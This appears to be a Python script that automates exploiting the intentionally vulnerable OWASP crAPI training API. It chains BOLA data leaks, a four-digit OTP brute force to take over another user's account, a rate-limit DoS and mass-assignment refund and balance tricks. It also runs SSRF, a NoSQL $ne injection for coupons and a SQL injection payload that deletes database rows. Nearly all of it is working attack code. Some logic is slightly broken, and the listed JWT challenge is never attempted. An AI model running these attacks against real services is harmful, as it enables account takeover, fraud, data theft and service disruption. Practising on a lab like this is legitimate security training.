import argparse
import json
from typing import Dict, Optional
import requests
import re
import logging
from rich.console import Console
from rich.table import Table

# Global variables
ip_address = ""
web_port = 8888
mail_port = 8025

results = {
    "ch1": {"challenge_id": 1, "description": "Access details of another user’s vehicle", "type": "BOLA", "status": "failed", "message": ""},
    "ch2": {"challenge_id": 2, "description": "Access mechanic reports of other users", "type": "BOLA", "status": "failed", "message": ""},
    "ch3": {"challenge_id": 3, "description": "Reset the password of a different user", "type": "BUA", "status": "failed", "message": ""},
    "ch4": {"challenge_id": 4, "description": "Find an API endpoint that leaks sensitive information of other users", "type": "EDA", "status": "failed", "message": ""},
    "ch5": {"challenge_id": 5, "description": "Find an API endpoint that leaks an internal property of a video", "type": "EDA", "status": "failed", "message": ""},
    "ch6": {"challenge_id": 6, "description": "Perform a layer 7 DoS using ‘contact mechanic’ feature", "type": "Rate limit", "status": "failed", "message": ""},
    "ch7": {"challenge_id": 7, "description": "Delete a video of another user", "type": "BFLA", "status": "failed", "message": ""},
    "ch8": {"challenge_id": 8, "description": "Get an item for free", "type": "Mass Assignment", "status": "failed", "message": ""},
    "ch9": {"challenge_id": 9, "description": "Increase your balance by $1,000 or more", "type": "Mass Assignment", "status": "failed", "message": ""},
    "ch10": {"challenge_id": 10, "description": "Update internal video properties", "type": "Mass Assignment", "status": "failed", "message": ""},
    "ch11": {"challenge_id": 11, "description": "Make crAPI send an HTTP call to 'www.google.com' and return the HTTP response", "type": "SSRF", "status": "failed", "message": ""},
    "ch12": {"challenge_id": 12, "description": "Find a way to get free coupons without knowing the coupon code", "type": "NoSQL Injection", "status": "failed", "message": ""},
    "ch13": {"challenge_id": 13, "description": "Find a way to redeem a coupon that you have already claimed by modifying the database", "type": "SQL Injection", "status": "failed", "message": ""},
    "ch14": {"challenge_id": 14, "description": "Find an endpoint that does not perform authentication checks for a user", "type": "Unauthenticated access", "status": "failed", "message": ""},
    "ch15": {"challenge_id": 15, "description": "Find a way to forge valid JWT Tokens", "type": "JWT vulnerabilities", "status": "failed", "message": ""},
}

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(funcName)s - %(message)s',
                    handlers=[
                        logging.FileHandler(f"crapi_hack.log"),
                        logging.StreamHandler()
                    ])


def signup(name, email, phone_number, password) -> int:
    url = f"http://{ip_address}:{web_port}/identity/api/auth/signup"
    data = {
        "name": name,
        "email": email,
        "number": phone_number,
        "password": password
    }
    response = requests.post(url, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to signup: {
                      response.status_code} - {response.text}")
    return response.status_code


def readmail() -> requests.Response:
    url = f"http://{ip_address}:{mail_port}/api/v2/messages?limit=50"
    response = requests.get(url)
    if response.status_code != 200:
        logging.error(
            f"Failed to read e-mail portal: {response.status_code} - {response.text}")
    return response


def login(username, password) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/auth/login"
    data = {
        "email": username,
        "password": password
    }

    response = requests.post(url, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to login: {
                      response.status_code} - {response.text}")
    return response


def parse_email_response(response) -> dict:
    email_data = {}

    data = response.json()
    for item in data.get('items', []):
        # Extract email
        email = item['Content']['Headers']['To'][0]

        # Extract VIN and PinCode from the body
        body = item['Raw']['Data']
        vin_match = re.search(r'VIN:.*<font[^>]*>([^<]+)</font>', body)
        pincode_match = re.search(
            r'Pincode:\s*<font[^>]*>([^<]+)</font>', body)

        vin = vin_match.group(1).replace('=\r\n', '') if vin_match else None
        pincode = pincode_match.group(1).replace(
            '=\r\n', '') if pincode_match else None

        email_data[email] = {
            "VIN": vin,
            "PinCode": pincode,
            "Token": None
        }

    return email_data


def read_recent_posts(token) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/community/api/v2/community/posts/recent"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        logging.error(f"Failed to read recent posts: {
                      response.status_code} - {response.text}")
    return response


def parse_recent_posts_response(response) -> dict:
    posts = response.json().get('posts', [])
    email_vehicleid = {}
    for post in posts:
        email = post['author']['email']
        vehicleid = post['author']['vehicleid']
        email_vehicleid[email] = vehicleid
    return email_vehicleid


def upload_video(token, video_name) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/user/videos"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    files = {
        "file": open(video_name, "rb")
    }
    response = requests.post(url, headers=headers, files=files)
    if response.status_code != 200:
        logging.error(f"Failed to upload video: {
                      response.status_code} - {response.text}")
    return response


def query_location(token, vehicleid) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/vehicle/{vehicleid}/location"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",

    }
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        logging.error(f"Failed to gather location: {
                      response.status_code} - {response.text}")
    return response


def provision_vehicle(token, vin, pincode) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/vehicle/add_vehicle"
    headers = {
        "Authorization": f"Bearer {token}",
    }
    data = {
        "vin": vin,
        "pincode": pincode
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to provision vehicle: {
                      response.status_code} - {response.text}")
    return response


def contact_mechanic(token, vin, report_url, repeat_request_if_failed=False, number_of_repeats=1) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/merchant/contact_mechanic"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    data = {
        "mechanic_code": "TRAC_JHN",
        "problem_details": "Breaks are not working",
        "vin": vin,
        "mechanic_api": report_url,
        "repeat_request_if_failed": False,
        "number_of_repeats": 1

    }
    response = requests.post(url, headers=headers, json=data)
    return response


def query_report(token, report_base_url, report_id) -> requests.Response:
    url = f"{report_base_url}={report_id}"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        logging.info(f"Found report {report_id}")
    return response


def forget_password(email) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/auth/forget-password"
    data = {
        "email": email
    }
    response = requests.post(url, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to forget password: {
            response.status_code} - {response.text}")
    return response


def check_otp_password_brute_v2(email, token, otp) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/auth/v2/check-otp"
    data = {
        "email": email,
        "otp": otp,
        "password": "P4ssw0rd@"
    }
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        logging.info("Found OTP: {otp}")
    return response


def get_video(token, video_id) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/user/videos/{video_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    response = requests.get(url, headers=headers)
    return response


def delete_video(token, video_id) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/admin/videos/{video_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    data = {
        "videoName": "SampleVideo_1280x720_1mb.mp4"
    }
    response = requests.delete(url, headers=headers, data=data)
    if response.status_code != 200:
        logging.error(f"Failed to delete video with id {video_id}: {
            response.status_code} - {response.text}")
    return response


def show_products(token) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/shop/products"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        logging.error(f"Couldn't find any product: {
            response.status_code} - {response.text}")
    return response


def buy_products(token, product_id, quantity) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/shop/orders"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    data = {
        "product_id": product_id,
        "quantity": quantity
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Error buying product {product_id}: {
            response.status_code} - {response.text}")

    return response


def rewrite_order_id(token, product_id, quantity, order_id) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/shop/orders/{order_id}"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    data = {
        "product_id": product_id,
        "quantity": quantity
    }
    response = requests.put(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Error rewriting order {order_id} for product {product_id}: {
            response.status_code} - {response.text}")
    return response


def refund_order_id(token, order_id) -> requests.Response:
    url = f"http://{ip_address}:{
        web_port}/workshop/api/shop/orders/return_order?order_id={order_id}"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(url, headers=headers)
    if response.status_code != 200:
        logging.error(f"Error refunding {order_id}: {
            response.status_code} - {response.text}")
    return response


def add_mock_product(token, name, price, image_url) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/shop/products"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    data = {
        "name": name,
        "price": price,
        "image_url": image_url
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to add mock product: {
            response.status_code} - {response.text}")
    return response


def get_user_dashboard(token) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/user/dashboard"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code != 200:
        logging.error(f"Failed to get user dashboard: {
            response.status_code} - {response.text}")
    return response


def update_dashboard_video_properties(token, video_id, video_name) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/identity/api/v2/user/videos/{video_id}"
    headers = {
        "Authorization": f"Bearer {token}"
    }

    data = {
        "videoName": video_name,
        "profileVideo": ''
    }
    response = requests.put(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to update dashboard video properties: {
            response.status_code} - {response.text}")
    return response


def discover_coupon(token: str, data: Dict) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/community/api/v2/coupon/validate-coupon"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Failed get a valid coupon: {
            response.status_code} - {response.text}")
    return response


def redeem_coupon(token: str, coupon_code: str, amount: str) -> requests.Response:
    url = f"http://{ip_address}:{web_port}/community/api/v2/coupon/new-coupon"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    data = {
        "coupon_code": coupon_code,
        "amount": amount
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code != 200:
        logging.error(f"Failed to redeem coupon: {
            response.status_code} - {response.text}")
    return response


def list_unauthenticated_operations(openapi_spec: dict):
    unauthenticated_operations = []

    for path, methods in openapi_spec.get('paths', {}).items():
        for method, details in methods.items():
            if isinstance(details, dict):
                # Check if the operation does not require bearerAuth
                if 'security' not in details or not any('bearerAuth' in sec for sec in details['security']):
                    # Check if the requestBody contains a password field
                    if 'requestBody' in details:
                        request_body = details['requestBody']
                        request_body_str = json.dumps(request_body)
                        if 'password' in request_body_str:
                            continue
                    operation_id = details.get(
                        'operationId', f"{method.upper()} {path}")
                    # Check whether it's a login
                    if 'login' in operation_id:
                        continue
                    unauthenticated_operations.append({
                        "operationId": operation_id,
                        "method": method.upper(),
                        "path": path
                    })

    return unauthenticated_operations


def read_qr_code() -> requests.Response:
    url = f"http://{ip_address}:{web_port}/workshop/api/shop/return_qr_code"
    response = requests.get(url)
    if response.status_code != 200:
        logging.error(f"Failed to read QR code: {
            response.status_code} - {response.text}")
    return response


def get_color(value) -> str:
    if value == "passed":
        return f"[bold red]{value}[/bold red]"
    else:
        return f"[bold green]{value}[/bold green]"
    return value


def rich_display_results():
    table = Table(title=f"crAPI Hack Results {ip_address}")
    table.add_column("Challenge ID", style="cyan")
    table.add_column("Description", style="cyan", max_width=50)
    table.add_column("Type", style="cyan")
    table.add_column("Status")
    table.add_column("Message")
    for key, value in results.items():
        table.add_row(
            str(value["challenge_id"]),
            value["description"],
            value["type"],
            get_color(value["status"]),
            value["message"]
        )
    console = Console()
    console.print(table, justify="center")


def extract_ip_address(html: str) -> Optional[str]:
    ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
    ip_address = re.search(ip_pattern, html).group()
    return ip_address


def main():
    global ip_address, web_port, mail_port
    parser = argparse.ArgumentParser(
        description='Process IP address and port.')
    parser.add_argument('--ip', type=str, required=True,
                        help='IP address of the server')
    parser.add_argument('--webport', type=int, required=False,
                        help='Port number of the web server', default=8888)
    parser.add_argument('--mailport', type=int, required=False,
                        help='Port number of the mail server', default=8025)

    args = parser.parse_args()

    ip_address = args.ip
    web_port = args.webport
    mail_port = args.mailport

    logging.info(f"IP Address: {ip_address}, Web Port: {
                 web_port}, Mail Port: {mail_port}")

    nico_email = "nico@athletic-club.com"
    inaki_email = "inaki@athletic-club.com"
    mechanic_report_url = f"http://{ip_address}:{
        web_port}/workshop/api/mechanic/receive_report"

    if signup("Nico Williams", nico_email, "6666543210", "Password!1234") != 200:
        logging.debug("Failed to signup user Nico Williams")
        # exit(1)

    if signup("Inaki Williams", inaki_email, "6666456789", "Password!1234") != 200:
        logging.debug("Failed to signup user Inaki Williams")
        # exit(1)

    response = readmail()

    email_data = parse_email_response(response)

    response = login(nico_email, "Password!1234")
    response_json = response.json()
    nico_token = response_json["token"]
    email_data[nico_email]["Token"] = nico_token

    response = login(inaki_email, "Password!1234")
    response_json = response.json()
    inaki_token = response_json["token"]
    email_data[inaki_email]["Token"] = inaki_token

    file_name = "../resources/SampleVideo_1280x720_1mb.mp4"
    response = upload_video(nico_token, file_name)
    response = upload_video(inaki_token, file_name)

    logging.debug("### Email Data:", email_data)

    # ##############
    # CHALLENGE 1
    # ##############
    response = read_recent_posts(nico_token)
    email_vehicleid = parse_recent_posts_response(response)

    logging.debug("Email VehicleID:", email_vehicleid)

    for email, vehicleid in email_vehicleid.items():
        response = query_location(nico_token, vehicleid)
        if response.status_code == 200:
            logging.info(f"Location for user {email}: {
                response.json()['vehicleLocation']}")
            results["ch1"]["status"] = "passed"
            results["ch1"]["message"] = f"Location for user {
                email}: {response.json()['vehicleLocation']}"
            break

    # ######################
    # # CHALLENGE 2 and 4
    # ######################

    # Provision vehicle for Inaki
    response = provision_vehicle(inaki_token, email_data[inaki_email]["VIN"],
                                 email_data[inaki_email]["PinCode"])
    if response.status_code == 200:
        logging.debug(f"Successful provision for Iñaki: {
            response.json()}")
    else:
        logging.error(f"Failed to provision vehicle for Inaki: {
                      response.status_code}")

    # Provision vehicle for Nico
    response = provision_vehicle(nico_token, email_data[nico_email]["VIN"],
                                 email_data[nico_email]["PinCode"])
    if response.status_code == 200:
        logging.debug(f"Successful provision for Nico: {
            response.json()}")
    else:
        logging.error(f"Failed to provision vehicle for Nico: {
                      response.status_code}")

    # Contact mechanic for Nico to get a report link
    response = contact_mechanic(
        nico_token, email_data[nico_email]["VIN"], mechanic_report_url, False)
    if response.status_code != 200:
        logging.error(f"Failed to get report ID for {
            email}: {response.status_code}")

    stolen_email = ""
    # Extract the report_link
    report_link = response.json()['response_from_mechanic_api']['report_link']
    # Print the report_link
    report_parts = report_link.split("=")
    report_id = report_parts[-1]
    report_base_url = report_parts[0]
    for id in 1, report_id * 2:
        if id != report_id:
            response = query_report(nico_token, report_base_url, id)
            if response.status_code == 200:
                logging.info(f"Leaked report {id} from user {
                    response.json()['vehicle']['owner']['email']}")
                results["ch2"]["status"] = "passed"
                results["ch2"]["message"] = f"Leaked report {id} from user {
                    response.json()['vehicle']['owner']['email']}"
                results["ch4"]["status"] = "passed"
                results["ch4"]["message"] = f"Leaked phone number {response.json(
                )['vehicle']['owner']['number']} from user {response.json()['vehicle']['owner']['email']}"
                # we'll use stolen e-mail in next challenge
                stolen_email = response.json()['vehicle']['owner']['email']

    # ##############
    # CHALLENGE 3
    # ##############

    # Forget password for stolen email
    response = forget_password(stolen_email)
    if response.status_code == 200:
        logging.debug(f"Forget password successful for {
            stolen_email} {response.json()}")
    else:
        logging.error(f"Failed to forget password for {
            stolen_email}: {response.status_code}")
        results["ch3"]["message"] = f"Password invalidation rejected with {
            response.status_code}"

    # Iterate between '0000' and '9999' to check OTP
    for otp in range(0, 10000):
        otp = f"{otp:04}"
        response = check_otp_password_brute_v2(stolen_email, nico_token, otp)
        if response.status_code == 200:
            logging.info(f"OTP {otp} is correct for {stolen_email}")
            results["ch3"]["status"] = "passed"
            results["ch3"]["message"] = f"Password invalidated for {
                stolen_email}"
            break

    # ##############
    # CHALLENGE 5
    # ##############

    # Get video for Inaki
    inaki_video_id = 0
    for id in range(0, 99):
        response = get_video(inaki_token, id)
        if response.status_code == 200:
            inaki_video_id = id
            logging.info(f"EDA challenge #5, Video for Inaki: id:{response.json()["id"]} video_name: {response.json()[
                "video_name"]} conversion_params: {response.json()["conversion_params"]}")
            results["ch5"]["status"] = "passed"
            results["ch5"]["message"] = f"Conversion params leaked: '{
                response.json()["conversion_params"]}' for video {response.json()["video_name"]}"

    # ##############
    # CHALLENGE 6
    # ##############

    # Generate a DoS attack on the server
    response = contact_mechanic(
        nico_token, email_data[nico_email]["VIN"] + "9", mechanic_report_url, True, 10000)
    if response.status_code != 200:
        logging.info(f"Error when contacting mechanic due to DoS attack:")
        results["ch6"]["status"] = "passed"
        results["ch6"]["message"] = f"Rate limit exceeded (error code: {
            response.status_code})"

    # ##############
    # CHALLENGE 7
    # ##############

    # Delete Inaki's video with Nico's JWT
    response = delete_video(nico_token, inaki_video_id)
    if response.status_code == 200:
        logging.info(
            f"Broken Function Access Level challenge #7: Deleted Inaki's video with Nico's JWT")
        results["ch7"]["status"] = "passed"
        results["ch7"]["message"] = f"Other user's video with id {
            inaki_video_id} deleted"
    else:
        logging.error(f"Failed to delete Inaki's video with NIco's JWT: {
            response.status_code} {response.text}")

    # ##############
    # CHALLENGE 8
    # ##############

    # Shop products
    response = show_products(nico_token)
    if response.status_code == 200:
        logging.debug(f"Available products: {response.json()}")
    else:
        logging.error(f"There are no available roducts: {
            response.status_code} {response.text}")

    product_id = response.json()['products'][0]["id"]
    # For next challenge
    product_image_url = response.json()['products'][0]["image_url"]
    # Nico buys
    response = buy_products(nico_token, product_id, 1)
    if response.status_code == 200:
        logging.info(f"Product bought: {response.json()}")
    else:
        logging.error(f"Failed to buy product: {
                      response.status_code} {response.text}")
    # Save order ID for next challenge and challenge #14
    order_id = response.json()["id"]
    # Rewrite order without consuming credit
    response = rewrite_order_id(nico_token, product_id, 4, order_id)
    if response.status_code == 200:
        logging.info(f"Rewrite order ID: {response.json()["orders"]["id"]}")
    else:
        print(f"Failed to rewrite order ID: {
              response.status_code} {response.text}")

    # Refund
    response = refund_order_id(nico_token, order_id)
    if response.status_code == 200:
        logging.info(f"Refunded order: {response.json()["message"]}")
        results["ch8"]["status"] = "passed"
        results["ch8"]["message"] = f"Item refunded: quantity={
            response.json()["order"]["quantity"]} and status={response.json()["order"]["status"]}"
    else:
        print(f"Failed to refund order ID: {
              response.status_code} {response.text}")

    # ##############
    # CHALLENGE 9
    # ##############

    # Increase your credit with a new mock product
    response = add_mock_product(
        nico_token, "Mock Product", -2000, product_image_url)
    if response.status_code == 200:
        logging.info(f"Added mock product: {
                     response.json()} with price of -2000")
    else:
        logging.error(f"Failed to add mock product: {
            response.status_code} {response.text}")
    mock_product_id = response.json()["id"]
    # Buy the mock product
    response = buy_products(nico_token, mock_product_id, 1)
    if response.status_code == 200:
        logging.info(f"BFLA challenge 9: Increase your balance: {
                     response.json()}")
        results["ch9"]["status"] = "passed"
        results["ch9"]["message"] = f"Balance increased to: {
            response.json()["credit"]}"
    else:
        logging.error(f"Failed to buy mock product: {
            response.status_code} {response.text}")

    # ###############
    # CHALLENGE 10
    # ###############

    # Update internal video properties
    response = get_user_dashboard(nico_token)
    if response.status_code == 200:
        logging.debug(f"User dashboard retrieved")
    else:
        logging.error(f"Failed to get user dashboard: {
            response.status_code} {response.text}")
    video_id = response.json()["video_id"]
    response = update_dashboard_video_properties(
        nico_token, video_id, "Play_me_if_you_can.mp4")
    if response.status_code == 200:
        logging.info(f"Updated dashboard video properties: {
            response.json()["video_name"]}")
        results["ch10"]["status"] = "passed"
        results["ch10"]["message"] = f"Video name updated to: {
            response.json()["video_name"]}"
    else:
        logging.error(f"Failed to update dashboard video properties: {
            response.status_code} {response.text}")

    # ###############
    # CHALLENGE 11
    # ###############
    find_my_ip_url = "https://meipaddress.com/"
    response = contact_mechanic(
        nico_token, email_data[nico_email]["VIN"], find_my_ip_url)
    if response.status_code == 200:
        logging.info(f"SSRF challenge 11: Sent HTTP request to {
            find_my_ip_url} and received response {response.status_code}")
        unknown_ip_address = extract_ip_address(response.text)
        results["ch11"]["status"] = "passed"
        results["ch11"]["message"] = f"Discovered IP address: {
            unknown_ip_address}"

    # ###############
    # CHALLENGE 12
    # ###############
    data = {
        "coupon_code": {
            "$ne": ""
        }
    }
    coupon_code = ""
    amount = ""  # We'll use it in next challenge

    response = discover_coupon(nico_token, data)
    if response.status_code == 200:
        logging.info(f"Discovered coupon: {
            response.json()}")
        coupon_code = response.json()["coupon_code"]
        amount = response.json()["amount"]
        response = redeem_coupon(nico_token, coupon_code, amount)
        if response.status_code == 200:
            logging.info(f"Redeemed coupon: {response.json()}")
            results["ch12"]["status"] = "passed"
            results["ch12"]["message"] = f"Discovered and reedemed coupon {
                coupon_code} with amount {amount}"
    else:
        logging.error(f"Failed to discover coupon: {
            response.status_code} {response.text}")

    # ###############
    # CHALLENGE 13
    # ###############
    sql_injection = f"{
        coupon_code}';DELETE FROM applied_coupon WHERE coupon_code='{coupon_code}';--"
    response = redeem_coupon(nico_token, sql_injection, amount)
    if response.status_code == 200:
        logging.info(f"SQL Injection challenge 13: {
            response.json()}")
        results["ch13"]["status"] = "passed"
        results["ch13"]["message"] = f"Reactivated coupon {coupon_code}: {
            response.json()}"
    else:
        logging.error(f"Failed to redeem coupon: {
            response.status_code} {response.text}")

    # ###############
    # CHALLENGE 14
    # ###############
    # Download open api spec from crapi github page
    openapi_spec_url = "https://raw.githubusercontent.com/OWASP/crAPI/refs/heads/develop/openapi-spec/crapi-openapi-spec.json"
    response = requests.get(openapi_spec_url)
    unauthenticated_operations = list_unauthenticated_operations(
        response.json())
    if len(unauthenticated_operations) > 0:
        logging.info(f"Unauthenticated operations: {
                     unauthenticated_operations}")
        response = read_qr_code()
        if response.status_code == 200:
            results["ch14"]["status"] = "passed"
            results["ch14"]["message"] = f"Unauthenticated operations: {
                len(unauthenticated_operations)}. QR code read successfully"
    else:
        logging.error(f"Failed to get unauthenticated operations: {
            response.status_code} {response.text}")


if __name__ == "__main__":
    main()
    rich_display_results()
